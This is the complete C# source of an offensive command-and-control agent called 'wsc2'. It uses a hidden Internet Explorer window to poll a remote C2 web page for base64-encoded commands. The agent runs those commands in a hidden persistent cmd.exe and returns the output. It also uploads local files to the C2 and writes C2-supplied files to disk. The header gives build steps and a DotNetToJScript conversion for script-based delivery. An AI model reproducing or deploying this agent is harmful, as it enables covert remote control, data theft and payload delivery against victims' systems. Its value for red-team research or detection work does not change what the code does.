/*
Author: Arno0x0x, Twitter: @Arno0x0x

======== Compile =========
To compile this code requires Visual Studio (express for Windows Desktop works just fine), then create a .Net Console Application projet.
Add the following references to your project:
    1. Microsoft HTML Object Library (MSHTML)
    2. Microsoft Internet Controls (SHDocVw)

You can then compile this either as an EXE or as a DLL for use with the DotNetToJScript project.

======== Use with the DotNetToJScript project =========
C:\Path\To\DotNetToJScript\bin\Release>DotNetToJScript.exe --ver=auto -l JScript -c wsc2.Agent wsc2.dll > wsc2Agent2.js

Then add the following line to the created "wsc2Agent.js" file:
o.Run("<url_to_wsc2.html>","<IDPrefix>");

*/
using System;
using System.Text;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using SHDocVw;
using mshtml;


namespace wsc2
{
    //****************************************************************************************
    // Main class
    //****************************************************************************************
    [ComVisible(true)]
    public class Agent
    {
        //--------------------------------------------------------------------------------------------------
        // Shell mode variables
        Process shellProcess = null; // The child process used for an interactive shell
        private static StringBuilder shellOutput = new StringBuilder();

        //==================================================================================================
        // Constructors for the the WSC2 agent class
        //==================================================================================================
		public Agent()
        {
        }
		
        public Agent(string callbackURL, string prefix)
        {
            Run(callbackURL, prefix);
        }

        //==================================================================================================
        // Static entry point for the program as an executable
        //==================================================================================================
        public static void Main(string[] args)
        {
            // Check we have the two required arguments
			if (args.Length == 2)
			{
				Agent agent = new Agent(args[0], args[1]);
			}
        }
		
        //==================================================================================================
        // Main function
        //==================================================================================================
        public void Run(string callbackURL, string prefix)
        {
			object o = null;
            InternetExplorer ie = new InternetExplorer();
            ie.Visible = false;

            //Do anything else with the window here that you wish
            ie.Navigate(callbackURL, ref o, ref o, ref o, ref o);

            while (ie.ReadyState != tagREADYSTATE.READYSTATE_COMPLETE)
            {
                Thread.Sleep(100);
            }

            IHTMLDocument3 ieDocument = ie.Document as IHTMLDocument3;
            IHTMLElement button = ieDocument.getElementById(prefix + "Button") as IHTMLElement;
            IHTMLElement input = ieDocument.getElementById(prefix + "Input") as IHTMLElement;
            IHTMLElement output = ieDocument.getElementById(prefix + "Output") as IHTMLElement;

            bool done = false;

            while (!done)
            {
                if (input.innerText != null)
                {

                    string[] inputParameters = input.innerText.Split('|');
                    string command = Encoding.UTF8.GetString(Convert.FromBase64String(inputParameters[0]));
                    input.innerText = String.Empty;

                    switch (command)
                    {
                        //--- Switch to CLI (shell) mode
                        case "cli":
                            string cli = Encoding.UTF8.GetString(Convert.FromBase64String(inputParameters[1]));
                            runShell(cli);

                            // We have no choice but leave some time to the child process to execute its command
                            // and write the result (hopefully all of it) to its StdOut. Only then we can get
                            // the shell output and return it to the C2
                            Thread.Sleep(500); // Trade-off
                            output.innerText = Convert.ToBase64String(Encoding.UTF8.GetBytes(getShellOutput()));
                            break;

                        //--- Transfer file from agent to C2
                        case "tfa2c2":
                            string fileName = Encoding.UTF8.GetString(Convert.FromBase64String(inputParameters[1]));
                            try
                            {
                                output.innerText = Convert.ToBase64String(File.ReadAllBytes(fileName));
                            }
                            catch (Exception ex)
                            {
                                output.innerText = Convert.ToBase64String(Encoding.UTF8.GetBytes("Error reading file: [" + ex.Message + "]"));
                            }
                            break;

                        //--- Transfer file from C2 to agent
                        case "tfc22a":
                            byte[] fileBytes = Convert.FromBase64String(inputParameters[1]);
                            string destinationPath = Encoding.UTF8.GetString(Convert.FromBase64String(inputParameters[2]));
                            fileName = Encoding.UTF8.GetString(Convert.FromBase64String(inputParameters[3]));
                            if (destinationPath == "temp") { destinationPath = Path.GetTempPath(); }
                    
                            try
                            {
                                File.WriteAllBytes(destinationPath + fileName, fileBytes);
                                output.innerText = Convert.ToBase64String(Encoding.UTF8.GetBytes("File transfered successfully"));
                            }
                            catch (Exception ex)
                            {
                                output.innerText = Convert.ToBase64String(Encoding.UTF8.GetBytes("Error writing file: [" + ex.Message + "]"));
                            }
                            break;

                        //--- Stop the agent
                        case "stop":
                            output.innerText = Convert.ToBase64String(Encoding.UTF8.GetBytes("Agent terminating..."));
                            done = true;
                            break;
                    }

                    button.click();
                }
               
                Thread.Sleep(100);
            }

            ie.Quit();
        }

        //==================================================================================================
        // This methods retrieves output from the shell process
        //==================================================================================================
        private string getShellOutput()
        {
            string stdout = String.Empty;

            // So we're in shell mode, is there some shell output to push to the C2 ?
            int currentLength = shellOutput.Length;
            if (currentLength > 0)
            {
                stdout = shellOutput.ToString(0, currentLength);
                shellOutput.Remove(0, currentLength);    
            }

            return stdout;
        }

        //==================================================================================================
        // This method runs a command in a spawned child process. The child process is
        // kept alive until it is explicitely exited. This allows for contextual commands and persistent
        // environment between commands.
        //==================================================================================================
        private void runShell(string command)
        {
            try
            {
                // Check if we already have a shell child process running
                // If not, start it and create the output and error data received callback
                if (shellProcess == null)
                {
                    ProcessStartInfo procStartInfo = new ProcessStartInfo();
                    procStartInfo.UseShellExecute = false;
                    procStartInfo.RedirectStandardInput = true;
                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.RedirectStandardError = true;
                    procStartInfo.FileName = "cmd.exe";
                    //procStartInfo.Arguments = "\"-\"";
                    procStartInfo.CreateNoWindow = true;
                    procStartInfo.ErrorDialog = false;

                    shellProcess = new Process();
                    shellProcess.StartInfo = procStartInfo;
                    shellProcess.EnableRaisingEvents = true;

                    shellProcess.OutputDataReceived += (sender, e) =>
                    {
                        if (!String.IsNullOrEmpty(e.Data))
                        {
                            shellOutput.Append(e.Data + "\n");
                        }
                    };

                    shellProcess.ErrorDataReceived += (sender, e) =>
                    {
                        if (!String.IsNullOrEmpty(e.Data))
                        {
                            shellOutput.Append(e.Data + "\n");
                        }
                    };

                    shellProcess.Exited += (sender, e) =>
                    {
                        shellOutput.Clear();
                        shellProcess = null;
                    };

                    shellProcess.Start();
                    shellProcess.BeginOutputReadLine();
                    shellProcess.BeginErrorReadLine();
                }

                // Write the command to stdin
                shellProcess.StandardInput.WriteLine(command);
            }
            catch (Exception ex)
            {
                // Log the exception
#if (DEBUG)
                while (ex != null)
                {
                    Console.WriteLine("[ERROR] " + ex.Message);
                    ex = ex.InnerException;
                }
#endif
            }
        }
    }
}